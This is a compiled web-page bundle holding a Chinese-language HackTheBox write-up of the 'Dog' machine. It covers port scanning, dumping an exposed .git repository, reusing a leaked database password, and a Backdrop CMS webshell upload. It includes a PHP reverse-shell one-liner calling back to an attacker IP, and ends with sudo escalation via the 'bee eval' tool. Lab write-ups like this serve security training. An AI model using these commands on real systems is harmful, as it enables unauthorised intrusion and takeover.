"use strict";(self.webpackChunktarget_machines_write_up=self.webpackChunktarget_machines_write_up||[]).push([[8614],{72638:(e,n,t)=>{t.r(n),t.d(n,{assets:()=>l,contentTitle:()=>a,default:()=>h,frontMatter:()=>o,metadata:()=>s,toc:()=>c});const s=JSON.parse('{"id":"HackTheBox/Machines/Dog/index","title":"Dog","description":"Difficulty: Easy","source":"@site/docs/HackTheBox/Machines/Dog/index.md","sourceDirName":"HackTheBox/Machines/Dog","slug":"/HackTheBox/Machines/Dog/","permalink":"/Target-Machines-WriteUp/docs/HackTheBox/Machines/Dog/","draft":false,"unlisted":false,"editUrl":"https://github.com/TryHackMyOffsecBox/Target-Machines-WriteUp/edit/main/docs/HackTheBox/Machines/Dog/index.md","tags":[],"version":"current","frontMatter":{},"sidebar":"HackTheBox_Sidebar","previous":{"title":"Devvortex","permalink":"/Target-Machines-WriteUp/docs/HackTheBox/Machines/Devvortex/"},"next":{"title":"EscapeTwo","permalink":"/Target-Machines-WriteUp/docs/HackTheBox/Machines/EscapeTwo/"}}');var r=t(74848),i=t(28453);const o={},a="Dog",l={},c=[{value:"ENTRY POINT",id:"entry-point",level:2},{value:"\u8d44\u4ea7\u63a2\u6d4b",id:"\u8d44\u4ea7\u63a2\u6d4b",level:2},{value:"Port 80 Web Service",id:"port-80-web-service",level:2},{value:"\u53cd\u5f39 shell",id:"\u53cd\u5f39-shell",level:2},{value:"\u73b0\u6709\u51ed\u636e\u8f6c\u79fb\u81f3 johncusack",id:"\u73b0\u6709\u51ed\u636e\u8f6c\u79fb\u81f3-johncusack",level:2},{value:"FLAG - USER",id:"flag---user",level:2},{value:"\u63d0\u6743\u81f3 root",id:"\u63d0\u6743\u81f3-root",level:2},{value:"FLAG - ROOT",id:"flag---root",level:2}];function d(e){const n={a:"a",admonition:"admonition",code:"code",h1:"h1",h2:"h2",header:"header",img:"img",p:"p",pre:"pre",...(0,i.R)(),...e.components};return(0,r.jsxs)(r.Fragment,{children:[(0,r.jsx)(n.header,{children:(0,r.jsx)(n.h1,{id:"dog",children:"Dog"})}),"\n",(0,r.jsxs)(n.admonition,{type:"info",children:[(0,r.jsx)(n.p,{children:"Difficulty: Easy"}),(0,r.jsx)(n.p,{children:"Operating System: Linux"})]}),"\n",(0,r.jsx)(n.h2,{id:"entry-point",children:"ENTRY POINT"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-plaintext",children:"10.10.11.58\n"})}),"\n",(0,r.jsx)(n.h2,{id:"\u8d44\u4ea7\u63a2\u6d4b",children:"\u8d44\u4ea7\u63a2\u6d4b"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-shell",children:"\u250c\u2500\u2500(randark \u327f kali)-[~]\n\u2514\u2500$ sudo ./tools/fscan-1.8.4/fscan -h 10.10.11.58\n\nstart infoscan\n10.10.11.58:80 open\n10.10.11.58:22 open\n[*] alive ports len is: 2\nstart vulscan\n[*] WebTitle http://10.10.11.58        code:200 len:13332  title:Home | Dog\n[+] InfoScan http://10.10.11.58        [CMS]\n\n\u250c\u2500\u2500(randark \u327f kali)-[~]\n\u2514\u2500$ sudo nmap -v --min-rate=2000 -A -p- 10.10.11.58\nNmap scan report for bogon (10.10.11.58)\nHost is up (0.14s latency).\nNot shown: 65533 closed tcp ports (reset)\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.12 (Ubuntu Linux; protocol 2.0)\n| ssh-hostkey:\n|   3072 97:2a:d2:2c:89:8a:d3:ed:4d:ac:00:d2:1e:87:49:a7 (RSA)\n|   256 27:7c:3c:eb:0f:26:e9:62:59:0f:0f:b1:38:c9:ae:2b (ECDSA)\n|_  256 93:88:47:4c:69:af:72:16:09:4c:ba:77:1e:3b:3b:eb (ED25519)\n80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))\n|_http-title: Home | Dog\n| http-methods:\n|_  Supported Methods: GET HEAD POST OPTIONS\n| http-git:\n|   10.10.11.58:80/.git/\n|     Git repository found!\n|     Repository description: Unnamed repository; edit this file 'description' to name the...\n|_    Last commit message: todo: customize url aliases.  reference:https://docs.backdro...\n| http-robots.txt: 22 disallowed entries (15 shown)\n| /core/ /profiles/ /README.md /web.config /admin\n| /comment/reply /filter/tips /node/add /search /user/register\n|_/user/password /user/login /user/logout /?q=admin /?q=comment/reply\n|_http-server-header: Apache/2.4.41 (Ubuntu)\n|_http-generator: Backdrop CMS 1 (https://backdropcms.org)\nDevice type: general purpose\nRunning: Linux 4.X|5.X\nOS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5\nOS details: Linux 4.15 - 5.19\n"})}),"\n",(0,r.jsx)(n.h2,{id:"port-80-web-service",children:"Port 80 Web Service"}),"\n",(0,r.jsx)(n.p,{children:"\u5c1d\u8bd5\u76f4\u63a5\u8bbf\u95ee"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"img",src:t(2584).A+"",width:"2560",height:"1371"})}),"\n",(0,r.jsxs)(n.p,{children:["\u5728\u9875\u9762\u5e95\u90e8\u53d1\u73b0\u6307\u7eb9\u4fe1\u606f ",(0,r.jsx)(n.code,{children:"Powered by Backdrop CMS"})," \u4e5f\u5c31\u662f ",(0,r.jsx)(n.a,{href:"https://backdropcms.org/",children:"Backdrop CMS"})," CMS \u6846\u67b6"]}),"\n",(0,r.jsxs)(n.p,{children:["\u53d1\u73b0\u7f51\u7ad9\u5b58\u5728\u6709 ",(0,r.jsx)(n.code,{children:".git"})," \u4fe1\u606f\u6cc4\u9732\uff0c\u5c1d\u8bd5\u5c06 git \u50a8\u5b58\u5e93 dump \u5230\u672c\u5730"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-shell",children:"\u250c\u2500\u2500(randark \u327f kali)-[~/tmp]\n\u2514\u2500$ perl ~/tools/dvcs-ripper-master/rip-git.pl -v -u http://10.10.11.58/.git/\n[i] Downloading git files from http://10.10.11.58/.git/\n[i] Auto-detecting 404 as 200 with 3 requests\n[i] Getting correct 404 responses\n[i] Using session name: KELTxFzt\n[d] found COMMIT_EDITMSG\n[d] found config\n[d] found description\n[d] found HEAD\n[d] found index\n[!] Not found for packed-refs: 404 Not Found\n[!] Not found for objects/info/alternates: 404 Not Found\n[!] Not found for info/grafts: 404 Not Found\n[d] found logs/HEAD\n[d] found objects/82/04779c764abd4c9d8d95038b6d22b6a7515afa\n[d] found refs/heads/master\n[i] Running git fsck to check for missing items\n......\n"})}),"\n",(0,r.jsx)(n.p,{children:"\u7ecf\u8fc7\u6f2b\u957f\u7684\u7b49\u5f85\uff0c\u7ec8\u4e8e\u5f97\u5230\u4e86\u6574\u4e2a\u6cc4\u9732\u7684 git \u50a8\u5b58\u5e93"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"img",src:t(88502).A+"",width:"2560",height:"1541"})}),"\n",(0,r.jsx)(n.p,{children:"\u5e76\u5728\u5176\u4e2d\u627e\u5230\u4e86\u7528\u6237\u540d\u4fe1\u606f"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-plaintext",metastring:'title="/files/config_83dddd18e1ec67fd8ff5bba2453c7fb3/active/update.settings.json"',children:"tiffany@dog.htb\n"})}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-plaintext",metastring:'title="/settings.php"',children:"$database = 'mysql://root:BackDropJ2024DS2024@127.0.0.1/backdrop';\n"})}),"\n",(0,r.jsxs)(n.p,{children:["\u5728\u7f51\u7ad9\u7684\u7528\u6237\u767b\u5f55\u754c\u9762 ",(0,r.jsx)(n.code,{children:"http://10.10.11.58/?q=user/login"})," \u6210\u529f\u4f7f\u7528\u51ed\u636e ",(0,r.jsx)(n.code,{children:"tiffany@dog.htb:BackDropJ2024DS2024"})," \u8fdb\u884c\u767b\u5f55"]}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"img",src:t(2847).A+"",width:"2560",height:"1371"})}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"img",src:t(27718).A+"",width:"2560",height:"1371"})}),"\n",(0,r.jsxs)(n.p,{children:["\u5728 ",(0,r.jsx)(n.code,{children:"http://10.10.11.58/?q=admin/modules/install"})," \u4e2d\uff0c\u627e\u5230\u4e86\u6a21\u5757\u7684\u5b89\u88c5\u529f\u80fd\u70b9"]}),"\n",(0,r.jsxs)(n.p,{children:["\u53c2\u8003 ",(0,r.jsx)(n.a,{href:"https://www.exploit-db.com/exploits/52021",children:"Backdrop CMS 1.27.1 - Authenticated Remote Command Execution (RCE)"})]}),"\n",(0,r.jsx)(n.p,{children:"\u9700\u8981\u6253\u5305\u4e00\u4e2a\u5305\u542b\u6709\u6076\u610f\u6a21\u5757\u7684 tar \u5305\uff0c\u800c\u4e0d\u662f zip \u5305\uff0c\u56e0\u4e3a CMS \u6682\u672a\u6dfb\u52a0\u6709 zip \u6a21\u5757"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-shell",children:"\u250c\u2500\u2500(env)(randark \u327f kali)-[~/tmp]\n\u2514\u2500$ python3 test-01.py http://10.10.11.58\nBackdrop CMS 1.27.1 - Remote Command Execution Exploit\nEvil module generating...\nEvil module generated! shell.zip\nGo to http://10.10.11.58/admin/modules/install and upload the shell.zip for Manual Installation.\nYour shell address: http://10.10.11.58/modules/shell/shell.php\n\n\u250c\u2500\u2500(env)(randark \u327f kali)-[~/tmp]\n\u2514\u2500$ tar czf shell.tar shell\n"})}),"\n",(0,r.jsx)(n.p,{children:"\u7136\u540e\u4e0a\u4f20\u6253\u5305\u597d\u7684 tar \u5305"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"img",src:t(23020).A+"",width:"2560",height:"1371"})}),"\n",(0,r.jsxs)(n.p,{children:["\u800c\u540e\u5728 ",(0,r.jsx)(n.code,{children:"http://10.10.11.58/modules/shell/"})," \u5c31\u53ef\u4ee5\u53d1\u73b0\u4e0a\u4f20\u597d\u7684\u6076\u610f\u6a21\u5757"]}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"img",src:t(30221).A+"",width:"2560",height:"1371"})}),"\n",(0,r.jsx)(n.p,{children:"\u5c1d\u8bd5\u8fdb\u884c\u5229\u7528"}),"\n",(0,r.jsx)(n.p,{children:(0,r.jsx)(n.img,{alt:"img",src:t(5834).A+"",width:"2560",height:"1371"})}),"\n",(0,r.jsx)(n.p,{children:"\u5229\u7528\u6210\u529f\uff0c\u8003\u8651\u53cd\u5f39 shell"}),"\n",(0,r.jsx)(n.h2,{id:"\u53cd\u5f39-shell",children:"\u53cd\u5f39 shell"}),"\n",(0,r.jsx)(n.p,{children:"\u4f7f\u7528 webshell \u6267\u884c\u4ee5\u4e0b\u547d\u4ee4"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-shell",children:'php -r \'$sock=fsockopen("10.10.16.31",9999);exec("bash <&3 >&3 2>&3");\'\n'})}),"\n",(0,r.jsx)(n.p,{children:"\u6210\u529f\u6536\u5230\u56de\u8fde\u7684\u4f1a\u8bdd"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-shell",children:"\u250c\u2500\u2500(randark \u327f kali)-[~]\n\u2514\u2500$ pwncat-cs -lp 9999\n[15:19:44] Welcome to pwncat \ud83d\udc08!\n[15:21:04] received connection from 10.10.11.58:56674\n[15:21:07] 10.10.11.58:56674: registered new host w/ db\n(local) pwncat$ back\n(remote) www-data@dog:/var/www/html/modules/shell$ whoami\nwww-data\n"})}),"\n",(0,r.jsx)(n.h2,{id:"\u73b0\u6709\u51ed\u636e\u8f6c\u79fb\u81f3-johncusack",children:"\u73b0\u6709\u51ed\u636e\u8f6c\u79fb\u81f3 johncusack"}),"\n",(0,r.jsx)(n.p,{children:"\u53d1\u73b0\u6b63\u5e38\u6743\u9650\u7528\u6237\u4e24\u4e2a"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-shell",children:"(remote) www-data@dog:/var/www/html/modules/shell$ ls -lh /home/\ntotal 8.0K\ndrwxr-xr-x 4 jobert     jobert     4.0K Feb  7 15:59 jobert\ndrwxr-xr-x 3 johncusack johncusack 4.0K Feb  7 15:59 johncusack\n"})}),"\n",(0,r.jsx)(n.p,{children:"\u5c1d\u8bd5\u4e0a\u6587\u53d1\u73b0\u7684 mysql \u6570\u636e\u5e93\u51ed\u636e\uff0c\u53d1\u73b0\u53ef\u4ee5\u767b\u5f55 johncusack"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-shell",children:"(remote) www-data@dog:/var/www/html/modules/shell$ su johncusack\nPassword:\nshell-init: error retrieving current directory: getcwd: cannot access parent directories: No such file or directory\nsh: 0: getcwd() failed: No such file or directory\njohncusack@dog:/var/www/html/modules/shell$\n"})}),"\n",(0,r.jsx)(n.h2,{id:"flag---user",children:"FLAG - USER"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-flag",metastring:'title="/home/johncusack/user.txt"',children:"e7ea764890f7ab52949fe7cdbaad87b5\n"})}),"\n",(0,r.jsx)(n.h2,{id:"\u63d0\u6743\u81f3-root",children:"\u63d0\u6743\u81f3 root"}),"\n",(0,r.jsx)(n.p,{children:"\u5728 sudo \u914d\u7f6e\u4fe1\u606f\u4e2d\u53ef\u4ee5\u53d1\u73b0"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-shell",children:"johncusack@dog:~$ sudo -l\nMatching Defaults entries for johncusack on dog:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\\:/snap/bin\n\nUser johncusack may run the following commands on dog:\n    (ALL : ALL) /usr/local/bin/bee\n\njohncusack@dog:~$ file /usr/local/bin/bee\n/usr/local/bin/bee: symbolic link to /backdrop_tool/bee/bee.php\n"})}),"\n",(0,r.jsx)(n.p,{children:"\u67e5\u770b php \u6e90\u4ee3\u7801"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-php",metastring:'title="/backdrop_tool/bee/bee.php"',children:"#!/usr/bin/env php\n<?php\n/**\n * @file\n * A command line utility for Backdrop CMS.\n */\n\n// Exit gracefully with a meaningful message if installed within a web\n// accessible location and accessed in the browser.\nif (!bee_is_cli()) {\n    echo bee_browser_load_html();\n    die();\n}\n\n// Set custom error handler.\nset_error_handler('bee_error_handler');\n\n// Include files.\nrequire_once __DIR__ . '/includes/miscellaneous.inc';\nrequire_once __DIR__ . '/includes/command.inc';\nrequire_once __DIR__ . '/includes/render.inc';\nrequire_once __DIR__ . '/includes/filesystem.inc';\nrequire_once __DIR__ . '/includes/input.inc';\nrequire_once __DIR__ . '/includes/globals.inc';\n\n// Main execution code.\nbee_initialize_server();\nbee_parse_input();\nbee_initialize_console();\nbee_process_command();\nbee_print_messages();\nbee_display_output();\nexit();\n\n/**\n * Custom error handler for `bee`.\n *\n * @param int $error_level\n *   The level of the error.\n * @param string $message\n *   Error message to output to the user.\n * @param string $filename\n *   The file that the error came from.\n * @param int $line\n *   The line number the error came from.\n * @param array $context\n *   An array of all variables from where the error was triggered.\n *\n * @see https://www.php.net/manual/en/function.set-error-handler.php\n * @see _backdrop_error_handler()\n */\nfunction bee_error_handler($error_level, $message, $filename, $line, array $context = NULL) {\n    require_once __DIR__ . '/includes/errors.inc';\n    _bee_error_handler_real($error_level, $message, $filename, $line, $context);\n}\n\n/**\n * Detects whether the current script is running in a command-line environment.\n */\nfunction bee_is_cli() {\n    return (empty($_SERVER['SERVER_SOFTWARE']) && (php_sapi_name() == 'cli' || (is_numeric($_SERVER['argc']) && $_SERVER['argc'] > 0)));\n}\n\n/**\n * Return the HTML to display if this page is loaded in the browser.\n *\n * @return string\n *   The concatentated html to display.\n */\nfunction bee_browser_load_html() {\n    // Set the title to use in h1 and title elements.\n    $title = \"Bee Gone!\";\n    // Place a white block over \"#!/usr/bin/env php\" as this is output before\n    // anything else.\n    $browser_output = \"<div style='background-color:white;position:absolute;width:15rem;height:3rem;top:0;left:0;z-index:9;'>&nbsp;</div>\";\n    // Add the bee logo and style appropriately.\n    $browser_output .= \"<img src='./images/bee.png'align='right'width='150'height='157'style='max-width:100%;margin-top:3rem;'>\";\n    // Add meaningful text.\n    $browser_output .= \"<h1 style='font-family:Tahoma;'>$title</h1>\";\n    $browser_output .= \"<p style='font-family:Verdana;'>Bee is a command line tool only and will not work in the browser.</p>\";\n    // Add the document title using javascript when the window loads.\n    $browser_output .= \"<script>window.onload = function(){document.title='$title';}<\/script>\";\n    // Output the combined string.\n    return $browser_output;\n}\n"})}),"\n",(0,r.jsxs)(n.p,{children:["\u7ecf\u8fc7\u4ee3\u7801\u5206\u6790\uff0c\u53ef\u4ee5\u5c1d\u8bd5\u4f7f\u7528 ",(0,r.jsx)(n.code,{children:"eval"})," \u51fd\u6570\u5b9e\u73b0\u4efb\u610f\u547d\u4ee4\u6267\u884c"]}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-shell",children:"johncusack@dog:~$ sudo /usr/local/bin/bee --root=/var/www/html eval \"echo shell_exec('whoami')\"\nroot\n"})}),"\n",(0,r.jsx)(n.h2,{id:"flag---root",children:"FLAG - ROOT"}),"\n",(0,r.jsx)(n.pre,{children:(0,r.jsx)(n.code,{className:"language-flag",metastring:'title="/root/root.txt"',children:"3fe5fde91fa680a9a6e062ba9a80cb50\n"})})]})}function h(e={}){const{wrapper:n}={...(0,i.R)(),...e.components};return n?(0,r.jsx)(n,{...e,children:(0,r.jsx)(d,{...e})}):d(e)}},88502:(e,n,t)=>{t.d(n,{A:()=>s});const s=t.p+"assets/images/image_20250304-150416-dccdb113b069af0f99eabe740d251fec.png"},2847:(e,n,t)=>{t.d(n,{A:()=>s});const s=t.p+"assets/images/image_20250308-150804-e165b2f8829fb4cb932824a0dcba74cc.png"},27718:(e,n,t)=>{t.d(n,{A:()=>s});const s=t.p+"assets/images/image_20250308-150816-45414b7c727aa9f127799e64c7c9cf84.png"},23020:(e,n,t)=>{t.d(n,{A:()=>s});const s=t.p+"assets/images/image_20250316-151652-7e68088a84f79008480d43367944abf0.png"},30221:(e,n,t)=>{t.d(n,{A:()=>s});const s=t.p+"assets/images/image_20250318-151813-36e37e1e20c73c21b8fd7fb56f5f6fad.png"},5834:(e,n,t)=>{t.d(n,{A:()=>s});const s=t.p+"assets/images/image_20250318-151847-4ccf893884f51627189ff1e5b3d56c25.png"},2584:(e,n,t)=>{t.d(n,{A:()=>s});const s=t.p+"assets/images/image_20250353-085334-0ff05a08b1b4db295b856560afafb769.png"},28453:(e,n,t)=>{t.d(n,{R:()=>o,x:()=>a});var s=t(96540);const r={},i=s.createContext(r);function o(e){const n=s.useContext(i);return s.useMemo((function(){return"function"==typeof e?e(n):{...n,...e}}),[n,e])}function a(e){let n;return n=e.disableParentContext?"function"==typeof e.components?e.components(r):e.components||r:o(e.components),s.createElement(i.Provider,{value:n},e.children)}}}]);